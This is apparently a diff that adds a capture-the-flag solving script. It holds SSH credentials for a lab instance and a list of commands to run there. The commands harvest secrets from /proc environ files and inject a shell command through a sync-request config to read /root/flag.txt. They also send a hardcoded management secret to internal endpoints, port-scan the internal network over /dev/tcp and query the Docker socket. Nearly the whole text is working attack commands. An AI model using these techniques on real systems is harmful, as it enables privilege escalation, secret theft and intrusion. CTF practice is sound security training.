@@ -1,0 +1,51 @@
+# Run these commands manually via SSH:
+# ssh player@instance.ctf.tdho.st -p 32967
+# Password: reyalp
+
+# === COMMANDS TO RUN ===
+
+# 1. Check /proc/16 (sync-loop.sh process) for clues
+cat /proc/16/cmdline | tr '\0' '\n'
+ls -la /proc/16/fd/
+cat /proc/16/environ | tr '\0' '\n' | grep -i 'secret\|flag\|key'
+
+# 2. Try command injection via sync-request with different formats
+echo 'cmd=/bin/sh -c "cat /root/flag.txt > /tmp/out"' > /opt/mc/config/sync-request.conf
+sleep 5 && cat /tmp/out
+
+# 3. Check for .git or version control that might have old sync-loop.sh
+find /opt -name '.git' -o -name '*.bak' -o -name '*~' 2>/dev/null
+
+# 4. Try HTTP management endpoints
+python3 << 'PYEND'
+import urllib.request
+secret = 'dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ'
+endpoints = ['/metrics', '/health', '/debug', '/config', '/sync']
+for ep in endpoints:
+    try:
+        req = urllib.request.Request(f'http://172.27.0.1:8080{ep}', headers={'X-Management-Secret': secret})
+        with urllib.request.urlopen(req, timeout=2) as r:
+            print(f'{ep}: {r.read().decode()[:500]}')
+    except Exception as e:
+        print(f'{ep}: {e}')
+PYEND
+
+# 5. Full port scan to find other services
+for port in 21 23 25 80 443 3000 3306 5000 5432 6379 8000 8080 8443 9000; do
+    timeout 1 bash -c "echo > /dev/tcp/172.27.0.1/$port" 2>/dev/null && echo "Port $port OPEN"
+done
+
+# 6. Check Docker socket if accessible
+ls -la /var/run/docker.sock 2>/dev/null
+python3 << 'PYEND'
+import socket, json
+try:
+    s = socket.socket(socket.AF_UNIX)
+    s.connect('/var/run/docker.sock')
+    s.send(b'GET /containers/json HTTP/1.0\r\n\r\n')
+    print(s.recv(4096).decode())
+except: print('Docker socket not accessible')
+PYEND
+
+# 7. Check if we missed any readable config files
+find /opt/mc -type f -readable 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null | head -20; done
